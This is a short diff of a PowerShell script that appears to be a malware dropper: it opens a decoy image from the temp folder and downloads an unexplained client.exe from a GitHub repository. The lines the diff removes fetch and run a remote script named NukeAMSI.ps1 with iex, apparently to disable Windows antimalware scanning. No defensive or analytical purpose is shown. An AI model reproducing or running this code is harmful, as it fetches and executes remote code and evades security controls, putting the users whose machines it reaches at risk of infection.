@@ -5,9 +5,6 @@ try {
     # Open the downloaded image
     Start-Process "$env:TEMP\blue-bird.jpg"
 
-    # Nuke
-    iex (iwr "https://raw.githubusercontent.com/anonymous300502/Nuke-AMSI/main/NukeAMSI.ps1" -UseBasicParsing).Content
-    
     # Download the client.exe file
     $exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
     $exePath = "$env:TEMP\client.exe"
